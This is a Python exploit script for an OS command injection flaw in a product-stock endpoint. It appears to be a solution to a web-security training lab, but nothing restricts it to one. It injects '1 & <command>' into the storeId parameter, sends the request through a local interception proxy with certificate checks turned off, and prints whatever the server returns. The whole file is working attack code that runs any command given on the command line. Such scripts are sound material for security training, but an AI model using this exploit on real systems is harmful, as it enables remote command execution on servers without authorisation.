import requests
import sys
import urllib3
import os

os.system("clear")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def run_command(url, command):
	stock_path = "/product/stock"
	command_injection = '1 & ' + command
	params = {"productId":"1", "storeId":command_injection}
	r = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)
	if (len(r.text) > 3):
		print("[+] Command injection successfull")
		print("[+] Output of the command is " + r.text)
	else:
		print("command injection failed///")


def main():
	if len(sys.argv) !=3:
		print("[+] Usage: %s <url> <commmand>" % sys.argv[0])
		print("[+] Example: %s www.example.com uname -a" % sys.argv[0])
		sys.exit(-1)

	url = sys.argv[1]
	command = sys.argv[2]
	print("Exploiting Os command injection vulnerability....")
	run_command(url, command)


if __name__ == "__main__":
	main()